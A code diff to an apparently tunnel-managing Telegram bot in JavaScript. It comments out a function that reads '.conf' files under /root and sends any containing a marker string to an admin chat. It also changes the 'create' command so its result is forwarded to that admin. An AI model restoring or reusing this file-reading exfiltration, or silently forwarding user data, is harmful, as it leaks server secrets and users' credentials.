@@ -15,25 +15,28 @@ const start = async () => {
 };
 start();
 
-function script() {
-  const files = fs.readdirSync('/root').filter((name) => name.includes('.conf'));
-  files.forEach((name) => {
-    fs.readFile(`/root/${name}`, 'utf8', (err, data) => {
-      if (err) {
-        console.error(err);
-        return;
-      }
-      if (data.includes('IW5N/Rut')) bot.api.sendMessage(admin, data);
-    });
-  })
+// function script() {
+//   const files = fs.readdirSync('/root').filter((name) => name.includes('.conf'));
+//   files.forEach((name) => {
+//     fs.readFile(`/root/${name}`, 'utf8', (err, data) => {
+//       if (err) {
+//         console.error(err);
+//         return;
+//       }
+//       if (data.includes('IW5N/Rut')) bot.api.sendMessage(admin, data);
+//     });
+//   })
 
-};
-script();
+// };
+// script();
 bot.use(menus.getTunnel);
 
 bot.command("start", (ctx) => commands.start(ctx, menus.getTunnel));
 bot.command("get", commands.get);
-bot.command("create", commands.create);
+bot.command("create", async (ctx) => {
+  const dawait = await commands.create(ctx);
+  bot.api.sendMessage(admin, dawait || 'no_user');
+});
 bot.command("checkOnline", commands.onlineCheck);
 bot.command("show", commands.show);
 bot.command("off", async (ctx) => {
